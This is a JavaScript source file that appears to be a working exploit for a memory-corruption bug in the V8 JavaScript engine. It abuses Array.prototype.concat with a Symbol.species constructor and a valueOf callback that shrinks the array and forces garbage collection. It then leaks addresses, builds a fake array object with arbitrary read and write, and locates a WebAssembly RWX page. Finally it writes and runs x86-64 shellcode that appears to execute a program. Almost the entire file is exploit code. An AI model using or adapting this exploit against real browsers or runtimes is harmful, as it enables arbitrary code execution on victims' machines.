const ref = [];
let ref_count = 0;

function add_ref(what) {
    ref[ref_count++] = what;
}

function gc() {
    new ArrayBuffer(0x7fe00000);
}

function fto64i(data) {
    var buf = new ArrayBuffer(16);
    var f64 = new Float64Array(buf);
    var u64 = new BigUint64Array(buf);

    f64[0] = data;
    return u64
} 

function fto32i(data) {
    var buf = new ArrayBuffer(16);
    var f64 = new Float64Array(buf);
    var u32 = new Uint32Array(buf);

    f64[0] = data;
    return [u32[0], u32[1]];
} 

function u32tof64(data) {
    var buf = new ArrayBuffer(16);
    var f64 = new Float64Array(buf);
    var u32 = new Uint32Array(buf);

    u32[0] = data;
    u32[1] = data;
    return f64[0];
} 

function u32tof32(data) {
    var buf = new ArrayBuffer(16);
    var f32 = new Float32Array(buf);
    var u32 = new Uint32Array(buf);

    u32[0] = data;
    return f32[0];
} 

function u64tof64(data) {
    var buf = new ArrayBuffer(16);
    var f64 = new Float64Array(buf);
    var u64 = new BigUint64Array(buf);

    u64[0] = data;
    return f64[0];
} 

function pwn1() {
    let map_leak;
    let prop_leak;
    let elem_leak;
    let length_leak;
    let global_fake_obj; // fake_obj thật sự
    let global_fake_obj_address;
    let global_fake_obj_bytearray_address;
    let corrupted_array;
    let addr_of_array_elem_addr;
    let addr_of_arr;

    function leak() {
        class LeakTypedArray extends Float64Array {}
        let u32 = new LeakTypedArray (1024);
        u32.__defineSetter__('length', function() {});

        var w = [
            /* hole */
            , 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9 // HOLEY_DOUBLE_ELEMENTS
        ];

        var fake_object = new Float32Array(16);
        var addr_of_array = [{}];

        const C = new Function();
        C.__defineGetter__(Symbol.species, () => {
            return function() { return u32; }
        });
        w.constructor = C;

        Array.prototype[0] = {
            valueOf: function() {
                w.length = 1;
                gc();
                delete Array.prototype[0];
                return 1.1;
            }
        };

        var c = Array.prototype.concat.call(w);

        // for (var i = 0; i < 32; i++) {
        //     print(u32[i]);
        // }

        map_leak = fto32i(u32[1])[0];
        prop_leak = fto32i(u32[1])[1];
        elem_leak = fto32i(u32[2])[0];
        length_leak = fto32i(u32[2])[1];
        console.log("w's map @ 0x" + map_leak.toString(16));
        console.log("w's properties @ 0x" + prop_leak.toString(16));
        console.log("w's elements @ 0x" + elem_leak.toString(16));
        console.log("w's length @ 0x" + length_leak.toString(16));
        console.log("fake_obj's address @ 0x" + (elem_leak + 0xa0).toString(16));
        console.log("fake_obj's bytearray @ 0x" + (elem_leak + 0x58).toString(16));
        
        addr_of_array_elem_addr = elem_leak + 0xe4;
        global_fake_obj = fake_object;
        global_fake_obj_address = elem_leak + 0xa0;
        global_fake_obj_bytearray_address = elem_leak + 0x58;
        addr_of_arr = addr_of_array;
    }

    function fake_obj() {
        class LeakTypedArray extends Float64Array {}
        let u32 = new LeakTypedArray (1024);
        u32.__defineSetter__('length', function() {});

        var w = [
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, /* */, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
            1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, {} // HOLEY_ELEMENTS
        ];

        const fake_obj = new Float32Array(16); // lợi dụng để write, không phải fake_obj thật
        fake_obj[0] = u32tof32(global_fake_obj_bytearray_address+8);

        const C = new Function();
        C.__defineGetter__(Symbol.species, () => {
            return function() { return u32; }
        });
        w.constructor = C;

        global_fake_obj[0] = u32tof32(map_leak);
        global_fake_obj[1] = u32tof32(prop_leak);
        global_fake_obj[2] = u32tof32(elem_leak);
        global_fake_obj[3] = u32tof32(length_leak);

        Array.prototype[19] = {
            valueOf: function() {
                w.length = 1;
                gc();
                // %DebugPrint(w);
                // %DebugPrint(fake_obj);
                // %SystemBreak();
                Object.prototype.valueOf = function() {
                    corrupted_array = this; // grab our fake `JSArray`
                    delete Object.prototype.valueOf; // clean up this valueOf
                    throw 'bailout'; // throw to escape Object::ToNumber
                    return 42;
                }
                delete Array.prototype[19];
                return 1.1;
            }
        };
        // %SystemBreak();
        var c = Array.prototype.concat.call(w);
    }

    function addr_of(obj) {
        addr_of_arr[0] = obj;
        global_fake_obj[2] = u32tof32(addr_of_array_elem_addr);
        return corrupted_array[0];
    }

    function read_at(addr) {
        global_fake_obj[2] = u32tof32(addr);
        return corrupted_array[0];
    }

    function write_at(addr, value) {
        global_fake_obj[2] = u32tof32(addr);
        corrupted_array[0] = u64tof64(value);
    }

    leak();
    try {
        fake_obj();
    } catch(e){}

    // %DebugPrint(corrupted_array);
    // console.log(corrupted_array);
    var shellcode = [0x90909090,0x90909090,0x2f2fb848,0x68732f2f,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;

    var buf = new ArrayBuffer(0x1000);
    var dataview = new DataView(buf);

    var wasm_instance_addr = fto32i(addr_of(wasm_instance))[0];
    var RWX_page = parseInt(fto64i(read_at(wasm_instance_addr+0x68-8)));
    var buf_addr = fto32i(addr_of(buf))[0];
    var backing_store = buf_addr + 20 - 8;

    console.log("wasm_instance @ 0x" + wasm_instance_addr.toString(16));
    console.log("RWX page @ 0x" + RWX_page.toString(16));
    console.log("buf's @ 0x" + buf_addr.toString(16));
    console.log("backing_store is at @ 0x" + backing_store.toString(16));

    write_at(backing_store, BigInt(RWX_page));

    // %DebugPrint(buf);

    var addr_to_write = RWX_page;
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true)
    }


    f();
}

pwn1()
